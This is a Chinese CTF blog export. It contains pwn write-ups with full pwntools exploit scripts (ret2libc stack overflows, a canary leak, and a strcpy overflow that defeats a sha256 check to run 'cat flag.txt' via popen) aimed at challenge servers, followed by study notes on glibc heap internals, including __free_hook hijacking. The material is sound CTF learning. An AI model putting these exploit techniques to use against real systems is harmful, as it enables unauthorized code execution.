<h2 id="pwn100"><a href="#pwn100" class="headerlink" title="pwn100"></a>pwn100</h2><p>checksec :<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec pwn100 </span><br><span class="line">[*] <span class="string">'/home/pluto/Desktop/pwn100'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><br>partial relro+NX<br>进入ida&amp;f5，经过两次调用后看到主要的函数为：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_40063D</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h] a2==200</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)(i + a1), <span class="number">1u</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//a1栈空间大小为0x40，然后就是rbp、rsp</span></span><br></pre></td></tr></table></figure><br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201208055615.png" alt="20201208055615"><br>可以看出存在明显的栈溢出，程序内也没有其他特别的sys函数和/bin/sh字符串，所以大概的思路是先查到libc版本，然后构造出system(/bin/sh)</p>
<p>得到exp：<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line">p = remote(<span class="string">"220.249.52.133"</span>, <span class="number">36759</span>)</span><br><span class="line"><span class="comment">#p = process("./b2")</span></span><br><span class="line">elf = ELF(<span class="string">"./b2"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">"puts"</span>]		</span><br><span class="line">pop_rdi = <span class="number">0x0400763</span></span><br><span class="line">main = <span class="number">0x40068E</span></span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line"></span><br><span class="line">leak = <span class="string">"a"</span>*<span class="number">0x40</span> + <span class="string">"a"</span>*<span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main) </span><br><span class="line">leak = leak.ljust(<span class="number">200</span>,<span class="string">"a"</span>)</span><br><span class="line">p.send(leak)</span><br><span class="line">p.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))	<span class="comment">#!!!p.recv() will contain a "0a"(\n)</span></span><br><span class="line"></span><br><span class="line">base = puts_addr - <span class="number">0x06f690</span></span><br><span class="line">sys = base + <span class="number">0x045390</span></span><br><span class="line">binsh = base + 	<span class="number">0x18cd57</span></span><br><span class="line">payload = <span class="string">"1"</span>*<span class="number">0x40</span> + <span class="string">"1"</span>*<span class="number">8</span> + p64(pop_rdi) + p64(binsh) + p64(sys) </span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">"a"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><br>这题主要是recv puts地址的时候要注意，数据是否截取多了/少了，因为会影响计算别的函数/字符串。<br>还有就是send和sendline和sendlineafter；recv和recvuntil对程序、执行exp的影响…</p>
<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>这题好迷…本地打通，远程打不通；远程打通，本地打不通（换过libc）<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line">p = remote(<span class="string">"220.249.52.133"</span>, <span class="number">43763</span>)</span><br><span class="line"><span class="comment">#p = process("./babystack")</span></span><br><span class="line">elf = ELF(<span class="string">"./babystack"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")# local</span></span><br><span class="line">libc = ELF(<span class="string">"./libc.so"</span>) <span class="comment">#remote</span></span><br><span class="line">stack = <span class="string">"a"</span>*<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendline(stack)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(canary)</span><br><span class="line"></span><br><span class="line">init = <span class="number">0x00400908</span></span><br><span class="line">pop_rdi = <span class="number">0x0400a93</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">leak_addr = stack + p64(canary) + <span class="string">"1"</span>*<span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(init)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">p.send(leak_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"3"</span>)<span class="comment">#????	&amp; rjust||ljust</span></span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = 	<span class="number">0x045390</span></span><br><span class="line">binsh_addr = 	<span class="number">0x18cd57</span></span><br><span class="line">offset = puts_addr - libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">system = offset + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh = offset + binsh_addr</span><br><span class="line"></span><br><span class="line">payload2 = stack + p64(canary) + <span class="string">"1"</span>*<span class="number">8</span> + p64(pop_rdi) + p64(binsh) + p64(system) + p64(init)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><br>就是一个 泄露canary、libc版本的过程。前几天就是这题和上一题，因为sendline/send/sendlineafter之类的问题把我整的怀疑人生…<br>不想评价</p>
<p><a href="https://www.cnblogs.com/bhxdn/p/12530945.html" target="_blank" rel="noopener">https://www.cnblogs.com/bhxdn/p/12530945.html</a></p>
<h2 id="Recho"><a href="#Recho" class="headerlink" title="Recho"></a>Recho</h2><p><a href="https://www.jianshu.com/p/8beb90b249d6" target="_blank" rel="noopener">https://www.jianshu.com/p/8beb90b249d6</a><br><a href="https://www.cnblogs.com/countfatcode/p/12326807.html" target="_blank" rel="noopener">https://www.cnblogs.com/countfatcode/p/12326807.html</a><br><a href="https://blog.csdn.net/seaaseesa/article/details/102992887" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/102992887</a></p>
<h2 id="secret-file"><a href="#secret-file" class="headerlink" title="secret_file"></a>secret_file</h2><p>运行一下：<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201213143540.png" alt="20201213143540"></p>
<p>checksec：<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201213142548.png" alt="20201213142548"><br>x86-64的程序，所有保护都打开了哎…</p>
<p>拖入ida看主函数伪代码如下：(部分函数名经过修饰，并添加注释)<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// er12</span></span><br><span class="line">  FILE *v9; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+0h] [rbp-308h]</span></span><br><span class="line">  <span class="keyword">char</span> *lineptr; <span class="comment">// [rsp+8h] [rbp-300h]</span></span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+10h] [rbp-2F8h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+110h] [rbp-1F8h] 执行的命令</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+12Bh] [rbp-1DDh] dest的sha256</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+16Ch] [rbp-19Ch] 参与sha256变换</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+18Ch] [rbp-17Ch] 与v15比较</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+1CCh] [rbp-13Ch]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+1D0h] [rbp-138h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v20; <span class="comment">// [rsp+2D8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v20 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_E60((<span class="keyword">char</span> *)&amp;dest);                       <span class="comment">// 填充v14和v15</span></span><br><span class="line">  v11 = <span class="number">0L</span>L;</span><br><span class="line">  lineptr = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( getline(&amp;lineptr, (<span class="keyword">size_t</span> *)&amp;v11, <span class="built_in">stdin</span>) == <span class="number">-1</span> )<span class="comment">// 输入，没有限制，回车结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v3 = <span class="built_in">strrchr</span>(lineptr, <span class="string">'\n'</span>);                  <span class="comment">// 输入判空</span></span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  *v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = &amp;v16;</span><br><span class="line">  v5 = &amp;v17;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;dest, lineptr);               <span class="comment">// 辨识度极高的vul_func</span></span><br><span class="line">  sha256_func((__int64)&amp;dest, &amp;v16, <span class="number">0x100</span>u);    <span class="comment">// v16==sha变换后的dest（0x100）</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = (<span class="keyword">unsigned</span> __int8)*v4;</span><br><span class="line">    v7 = v5;</span><br><span class="line">    v5 += <span class="number">2</span>;</span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="built_in">snprintf</span>(v7, <span class="number">3u</span>LL, <span class="string">"%02x"</span>, v6);             <span class="comment">// 最终目的：把v17填充为hex的v16</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 != &amp;v18 );</span><br><span class="line">  v8 = <span class="built_in">strcmp</span>(&amp;v15, &amp;v17);                      <span class="comment">// 比较v15和v17，如果不同就报错</span></span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"wrong password!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = popen(&amp;v14, <span class="string">"r"</span>);                        <span class="comment">// 把命令传到binsh执行</span></span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( fgets(&amp;s, <span class="number">256</span>, v9) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, &amp;s);</span><br><span class="line">  fclose(v9);</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>剩下两个子函数不表，功能写在注释里了<br>程序很简短，其中可以马上注意到很熟悉的危险函数strcpy()，再一看发现两个不是很熟悉的函数：getline和popen</p>
<ul>
<li>getline(char <em>*lineptr, size_t </em>n, FILE *stream):将输入的字符串放入lineptr指向的空间，（如果为NULL则由系统malloc），n:如果是malloc出的则为0，stream：终止符（？）<br>输入结束的方式为1. 读取字符数达到n，2.遇到函数终止符（\n），3.断开输入</li>
</ul>
<p>可以看到，这里的getline也是一个没有限制输入的危险函数</p>
<ul>
<li>popen：将命令传入/bin/sh中由shell执行，分为输入和输出(w和r)</li>
</ul>
<p>所以我们要做的就是让popen执行get flag 的命令。<br><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201213144954.png" alt="20201213144954"><br>那么首先就要满足这个条件。再一看，发现v17的来源是(hex)v16，v16是经过sha256变换的des。所以想get shell只需要v15==v16<br>一看栈中变量的分布，发现它们都可以被覆盖呀！！！</p>
<p>所以exp就出来了：<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">p = remote(<span class="string">"220.249.52.134"</span>, <span class="number">52529</span>)</span><br><span class="line"></span><br><span class="line">v15 = hashlib.sha256(<span class="string">"a"</span>*<span class="number">0x100</span>).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p1 = "a"*0x100 + "ls;".ljust(0x1b, ) + v15 </span></span><br><span class="line">p1 = <span class="string">"a"</span>*<span class="number">0x100</span> + <span class="string">"cat flag.txt;"</span>.ljust(<span class="number">0x1b</span>, ) + v15</span><br><span class="line"><span class="comment">#dest + cmd + sha256</span></span><br><span class="line"></span><br><span class="line">p.sendline(p1)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure><br>分两次进行，一次查看目录下的文件，第二次打开.txt文件</p>
<p>over</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>堆学习</title>
    <url>/21992.html</url>
    <content><![CDATA[<h1 id="堆相关数据结构"><a href="#堆相关数据结构" class="headerlink" title="堆相关数据结构"></a>堆相关数据结构</h1><h2 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><p>程序malloc出的内存称为chunk，在ptmalloc内部用下面的结构体表示，内存空间释放后被加入空闲管理列表。一个chunk不论是分配还是释放，结构都相同。<br><a id="more"></a><br>malloc_chunk结构体<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* 前一个chunk（物理相连，较低地址）的大小，包括chunk头（如果前一个chunk空闲），否则可以储存前一个chunk的数据，此时这个域的这个字段无效（chunk的空间复用）  */</span></span><br><span class="line">  INTERNAL_SIZE_T      <span class="built_in">size</span>;       </span><br><span class="line">   <span class="comment">/* 该chunk的大小为2*size的整数倍（size=4或8，32或64位） </span></span><br><span class="line"><span class="comment">      该字段的低3位与大小无关，从高到低 表示</span></span><br><span class="line"><span class="comment">      “是否属于主线程NON_MAIN_ARENA”、</span></span><br><span class="line"><span class="comment">      “是否是由mmap分配IS_MAPPED”、</span></span><br><span class="line"><span class="comment">      “是否被分配PREV_INUSE”</span></span><br><span class="line"><span class="comment">      </span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/*chunk处于分配状态时从fd开始的字段为用户数据</span></span><br><span class="line"><span class="comment">  struct malloc_chunk* bk;         chunk处于空闲时fd指向前一个空闲的chunk的指针，bk指向后一个空闲的chunk指针(非物理相连)*/</span></span><br><span class="line">                                    </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span>         <span class="comment">/*只有chunk空闲时才使用，用于较大的chunk</span></span><br><span class="line"><span class="comment">  struct malloc_chunk* bk_nextsize;         指向与当前chunk大小不同的第一个空闲块*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>一般chunk size表示malloc_chunk的实际大小，而chunk unused size 表示该chunk中除了prev_size、size、fd等辅助成员外的实际大小</p>
<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>bin是由chunk结构体组成的链表，按照chunk的大小来管理free后的chunk</p>
<p>bin链主要有以下几类，其中只有fast bin是单链表，其他都是双向链表。<br>对于small bins，large bins，unsorted bins来说，ptmalloc将它们维护在同一个数组中，对应的数据结构在malloc_state中   </p>
<h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4><p>不属于bins，是ptmalloc单独管理小堆块的数据结构，如果free的chunk大小在0x20~0x80，会优先进入fastbin<br>采用LIFO，用于较小的内存块。当用户需要的chunk大小小于ptmalloc的最大大小时，ptmalloc先判断fastbin中是否有对应大小的空闲块。<br>fastbin中的chunk的inuse始终置为1，不会与其他chunk合并。但如果相邻的chunk合并后的大小大于某个值（FASTBIN_CONSOLIDATION_THRESHOLD），就需要把fastbin中的chunk合并（内存碎片）</p>
<p>fastbinsY数组中每个fastbin元素指向该链表的尾节点，尾节点通过fd指针指向前一个节点</p>
<h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>采用FIFO，有62个循环双向链表，每个下标对应的chunk大小都一致，关系为<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x(下标)   2*4*x(32位)	2*8*x(64位)</span><br></pre></td></tr></table></figure><br>其中每个链表都有链表头结点<br>fastbin与smallbin中的chunk的大小有很大一部分会重合，fastbin中的chunk很有可能被放到smallbin中</p>
<h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><p>包括63个bin，每个bin中的chunk大小不一致。将63个bin分成6组，每组bin中的chunk大小的公差（最大-最小）一致</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>组</th>
<th>数量</th>
<th>公差</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>32</td>
<td>64B</td>
</tr>
<tr>
<td>2</td>
<td>16</td>
<td>512B</td>
</tr>
<tr>
<td>3</td>
<td>8</td>
<td>4096B</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>32768B</td>
</tr>
<tr>
<td>5</td>
<td>2</td>
<td>262144B</td>
</tr>
<tr>
<td>6</td>
<td>1</td>
<td>不限制</td>
</tr>
</tbody>
</table>
</div>
<p>其中所有chunk按照从大到小排列</p>
<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>采用FIFO<br>可以视作空闲chunk回归所属bin前的缓冲区<br>unsorted bin只有一个链表。<br>其中的chunk处于乱序状态，主要有两个来源：</p>
<ul>
<li>较大的chunk被分割后，剩下的部分大于minsize</li>
<li>释放一个不属于fastbin的chunk，并且该chunk不与top chunk相邻</li>
</ul>
<h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>程序第一次进行malloc时，heap会被分为两块，其中一块就是top chunk。top chunk即当前堆的物理地址最高的chunk，不属于任何一个bin，只用于在所有bin不满足请求大小时进行分配（如果大小满足），然后将剩下的部分作为top chunk，否则就对heap进行扩展然后再分配（原来的top_chunk紧接着进入unsorted bin，这里可能产生漏洞），在main_arena中通过sbrk扩展，在thread_arena中通过mmap扩展。<br>topchunk的prev_inuse位始终为1</p>
<h3 id="last-remainder-chunk"><a href="#last-remainder-chunk" class="headerlink" title="last remainder chunk"></a>last remainder chunk</h3><p>当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，再将该新的chunk变成新的last remainder chunk</p>
<p>此类型的chunk用于提高连续malloc(small chunk)的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个small chunk，且该请求无法被small bin满足，那么就转而交由unsorted bin处理。同时，假设当前unsorted bin中只有一个chunk的话——就是last remainder chunk，那么就将该chunk分成两部分：前者分配给用户，剩下的部分放到unsorted bin中，并成为新的last remainder chunk。这样就保证了连续malloc(small chunk)中，各个small chunk在内存分布中是相邻的，即提高了内存分配的局部性。</p>
<h2 id="宏观结构"><a href="#宏观结构" class="headerlink" title="宏观结构"></a>宏观结构</h2><p>在glibc malloc中针对堆管理，主要涉及到以下3种数据结构：</p>
<ul>
<li>heap_info: 即Heap Header，因为一个thread arena（注意：不包含main thread）可以包含多个heaps，所以为了便于管理，就给每个heap分配一个heap header。在当前heap不够用的时候，malloc会通过系统调用mmap申请新的堆空间，新的堆空间会被添加到当前thread arena中，便于管理。</li>
<li>malloc_state: 即Arena Header，每个thread只含有一个Arena Header。Arena Header包含bins的信息、top chunk以及最后一个remainder chunk等</li>
<li>malloc_chunk: 即Chunk Header，一个heap被分为多个chunk，至于每个chunk的大小，这是根据用户的请求决定的，也就是说用户调用malloc(size)传递的size参数“就是”chunk的大小.每个chunk都由一个结构体malloc_chunk表示</li>
</ul>
<h3 id="Arena"><a href="#Arena" class="headerlink" title="Arena"></a>Arena</h3><p>一个线程只有一个arena，各个线程的arena都是独立的。   </p>
<p>每个程序中的arena数量是有限制的，与和核心数量有关，因此不是每个线程都会有独立的arena。另外，如果线程数大于核心数的两倍，就必然有线程处于等待状态，所以没有必要都分配独立的arena</p>
<p>主线程的arena称为main_arena；子线程的称为thread_arena。   </p>
<p>与 thread arena 不同，main arena 的 arena header（state） 不是保存在通过 sbrk 申请的堆段里，而是作为一个全局变量，可以在 libc.so 的数据段中找到</p>
<h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap info"></a>heap info</h3><p>专门为mmap申请的内存（memory mapping segment)准备的，用来记录堆的信息和链接结构<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Main arena 无需维护多个堆，因此也无需 heap_info。当空间耗尽时，与 thread arena 不同，main arena 可以通过 sbrk 拓展堆段，直至堆段「碰」到内存映射段；</span><br></pre></td></tr></table></figure></p>
<p>结构的记录的信息包括：</p>
<ul>
<li>堆对应的arena的地址</li>
<li>上一个heap_info的地址</li>
<li>当前堆的大小</li>
<li>用于对齐</li>
</ul>
<h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>用于管理堆，记录每个arena当前申请的所有内存的具体状态。</p>
<p>无论是main arena还是thread arena，都只有一个malloc state结构。对于main arena，这个结构是一个全局变量，放在libc.so的数据段中；对于thread arena，这个结构会放在最新申请的arena中</p>
<h1 id="malloc的时候做了什么"><a href="#malloc的时候做了什么" class="headerlink" title="malloc的时候做了什么"></a>malloc的时候做了什么</h1><p>（以ptmalloc为例）</p>
<ul>
<li>获得锁或用mmap()开辟出非主分配区</li>
<li>将申请的内存大小转换为实际分配的内存大小</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">malloc寻找堆块的顺序:</span><br><span class="line">1. 在fastbin中寻找有没有对应的chunk</span><br><span class="line">2. 请求大小为small bin范围，在small bin中寻找有没有对应的chunk</span><br><span class="line">3. 考虑是否是large bin，调用malloc_consolidate合并fastbin</span><br><span class="line">   （ fast bin 中的 chunk，将有可能能够合并的 chunk 先进行合并后放到 unsorted bin 中，不能够合并的就直接放到 unsorted bin 中，然后再在下面的大循环中进行相应的处理）</span><br><span class="line"></span><br><span class="line">（↓进入大循环↓）</span><br><span class="line">4. 在unsorted bin中寻找有没有合适的chunk</span><br><span class="line">  如果小于unsorted bin，就对unsorted bin进行切割；如果不满足请求的大小，先把unsorted bin放入small bins或large bins ，然后进行下一步</span><br><span class="line">（--大循环结束--最多迭代10000次）</span><br><span class="line"></span><br><span class="line">5. 在large bin中寻找有没有合适的chunk，根据smalllest-first，best-fit 的原则</span><br><span class="line">  （ps:large bin中的堆块不会进行切割，不满足就到top chunk切割（这个知识点与分配无关）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6. 寻找较大的bin链中有没有合适的chunk</span><br><span class="line">寻找所有map中合适大小的chunk</span><br><span class="line"></span><br><span class="line">7. 使用top_chunk</span><br><span class="line"></span><br><span class="line">8. top_chunk不够用，如果是主分配区就调用sbrk()；非主分配区就调用mmap()，增加top_chunk大小</span><br></pre></td></tr></table></figure>
<ul>
<li>大循环</li>
</ul>
<ol>
<li>按照 FIFO 的方式逐个将 unsorted bin 中的 chunk 取出来<br>如果是 small request，则考虑是不是恰好满足，是的话，直接返回。<br>如果不是的话，放到对应的 bin 中。</li>
</ol>
<p>__int_malloc的大循环主要用来处理unsorted bin。如果整个循环没有找到合适的bin，说明所有的unsorted bin的大小都不满足要求</p>
<ul>
<li>malloc_consolidate：用于将fastbin中的chunk合并，清空fastbin。<br>先尝试向后合并，然后尝试向前合并：<br>如果向前相邻topchunk则直接合并，如果不相邻则尝试向前合并后插入unsortedbin， 然后获取下一个空闲的chunk，直到fastbin清空</li>
</ul>
<h2 id="堆分配函数"><a href="#堆分配函数" class="headerlink" title="堆分配函数"></a>堆分配函数</h2><ul>
<li>malloc</li>
<li>calloc<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line">ptr=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure></li>
<li>realloc<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时</span><br><span class="line">  如果申请 size &gt; 原来 size</span><br><span class="line">    如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小</span><br><span class="line">    如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)</span><br><span class="line">  如果申请 size &lt; 原来 size</span><br><span class="line">    如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变</span><br><span class="line">    如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</span><br><span class="line">当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)</span><br><span class="line">当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="free的时候又发生了什么"><a href="#free的时候又发生了什么" class="headerlink" title="free的时候又发生了什么"></a>free的时候又发生了什么</h1><p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#__libc_free" target="_blank" rel="noopener">源码</a></p>
<h2 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h2><p>只有一个参数，为需要free的地址<br>判断：</p>
<ol>
<li>是否hook了（有则执行free_hook，结束free）（下）</li>
<li>free的参数，为NULL直接返回</li>
<li>（指针指向chunk头部）</li>
<li>如果内存是mmap得到的则进行munmap_chunk()，否则执行_int_free（参数为main_arena结构体的地址、header、0）</li>
</ol>
<ul>
<li>free_hook：<br>判断是否有用户自定义的函数，如果有就执行，然后结束堆释放<br><strong>__free_hook漏洞</strong>：如果将__free_hook变为一个system的地址，那么就可以执行这个system的地址</li>
</ul>
<h3 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h3><h4 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h4><ol>
<li>不能指向非法地址</li>
<li>指针对齐2*SIZE_SZ（32位下=4；64位下=8）</li>
<li>free的空间大小小于限制最小的chunk</li>
</ol>
<p>如果检查没有问题就在各个bin分支进行判断</p>
